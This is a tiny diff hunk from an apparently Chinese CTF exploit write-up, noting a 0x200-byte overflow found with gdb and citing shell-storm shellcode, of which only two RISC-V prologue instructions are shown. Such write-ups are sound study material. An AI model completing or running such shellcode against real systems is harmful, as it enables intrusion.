@@ -200,7 +200,7 @@ gdb调一下发现在echo不存在的文件的时候可以输入0x200个字节
 ```python
 #from http://shell-storm.org/shellcode/files/shellcode-908.php
 
-
+'''
 0x000100b0      0111           addi sp, sp, -32
 
 0x000100b2      06ec           sd ra, 24(sp)
